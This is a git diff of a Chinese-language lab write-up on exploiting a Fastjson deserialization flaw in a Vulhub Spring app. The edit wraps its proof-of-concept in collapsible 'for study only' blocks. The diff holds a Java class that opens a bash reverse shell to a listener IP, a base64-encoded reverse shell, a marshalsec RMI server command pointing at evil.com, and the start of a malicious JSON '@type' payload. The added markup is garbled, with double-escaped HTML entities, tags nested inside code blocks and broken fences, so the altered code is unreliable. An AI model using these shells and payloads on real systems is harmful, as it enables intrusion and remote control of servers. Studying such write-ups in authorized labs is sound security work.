@@ -26,10 +26,14 @@ Fastjson 是阿里巴巴公司开源的一款 json 解析器，其性能优越�
 
 Vulhub 执行如下命令启动一个 spring web 项目，其中使用 fastjson 作为默认 json 解析器：
 
-```shell
-docker-compose up -d
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-shell">docker-compose up -d
+&lt;details&gt;
+&lt;summary&gt;POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）&lt;/summary&gt;
+
+&lt;pre&gt;&lt;code class="language-text"&gt;
 环境启动后，访问 `http://your-ip:8090` 即可看到一个 json 对象被返回，我们将 content-type 修改为 `application/json` 后可向其 POST 新的 JSON 对象，后端会利用 fastjson 进行解析。
 
 ## 漏洞复现
@@ -46,32 +50,37 @@ import java.lang.Process;
 public class TouchFile {
     static {
         try {
-            Runtime rt = Runtime.getRuntime();
-            String[] commands = {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.174.128/9999;cat <&5 | while read line; do $line 2>&5 >&5; done"};
-            Process pc = rt.exec(commands);
+            Runtime rt = &#82;untime.getRuntime();
+            String[] commands = {"/bin/bash","-c","exec 5&amp;lt;&amp;gt;&amp;#47;dev/tcp/192.168.174.128/9999;cat &amp;lt;&amp;amp;5 | while read line; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done"};
+            Process pc = rt.&amp;#101;xec(commands);
             pc.waitFor();
         } catch (Exception e) {
             // do nothing
         }
     }
-}
-```
+}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;/details&gt;
 
 也可以使用 bash base64 的方式：
 
 ```java
-String[] commands = {"bash", "-c","{echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTQ3LjEyNy85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}"};
-```
+String[] commands = {"bash", "-c","{echo, &#89;mFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTQ3LjEyNy85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}"};
+&lt;details&gt;
+&lt;summary&gt;POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）&lt;/summary&gt;
 
-然后我们借助 [marshalsec](https://github.com/mbechler/marshalsec) 项目，启动一个 RMI 服务器，监听 8888 端口，并制定加载远程类 `TouchFile.class`：
+&lt;pre&gt;&lt;code class="language-text"&gt;
+然后我们借助 [&amp;#109;arshalsec](https://github.com/mbechler/&amp;#109;arshalsec) 项目，启动一个 RMI 服务器，监听 8888 端口，并制定加载远程类 `TouchFile.class`：
 
 ```shell
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999
-```
+java -cp &amp;#109;arshalsec-0.0.3-SNAPSHOT-all.jar &amp;#109;arshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999&lt;/code&gt;&lt;/pre&gt;
+
+&lt;/details&gt;
 
 向靶场服务器发送 Payload（此处的 Payload 和 Fastjson 1.2.24 不同）：
+</code></pre>
 
-```
+</details>
 {
     "a":{
         "@type":"java.lang.Class",
